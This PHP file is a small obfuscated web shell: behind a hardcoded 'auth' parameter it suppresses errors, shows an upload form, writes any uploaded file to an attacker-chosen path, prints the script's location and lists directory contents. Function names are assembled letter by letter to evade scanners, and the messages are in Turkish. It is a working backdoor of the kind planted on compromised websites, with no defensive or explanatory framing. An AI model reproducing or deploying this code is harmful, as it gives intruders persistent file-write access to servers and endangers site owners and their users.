<?php
$err = "e"."r"."r"."o"."r"."_"."r"."e"."p"."o"."r"."t"."ing";
ini_set($err, "0");
if ($_REQUEST['auth'] === 'auth') {
echo '<!DOCTYPE html>
<html>
<head>
  <title>Upload your files</title>
</head>
<body>
  <form enctype="multipart/form-data" action="'.basename($_SERVER['PHP_SELF']).'" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br /><br />
    <input type="path" name="path"></input><br /><br />
    <input type="submit" value="Upload"></input>
	<input type="hidden" name="auth" value="auth">
  </form>
</body>
</html>';
  echo $_SERVER["SCRIPT_FILENAME"];
  if(!empty($_FILES['uploaded_file']))
  {
	$mfile = "m"."o"."v"."e"."_up"."loa"."ded_"."fi"."le";
    $path = $_POST["path"];
    $path = $path . basename( $_FILES['uploaded_file']['name']);
    if($mfile($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo '</br>'."The file ".  basename( $_FILES['uploaded_file']['name']). 
      " Yuklendi";
    } else{
        echo '</br>'. "Dosyayı yüklerken bir hata oluştu, lütfen tekrar deneyin!";
    }
  }
  echo "<br /><br />"; $dosyalar = glob("*"); foreach ($dosyalar as $dosya) { echo $dosya . "<br />"; }
}
?>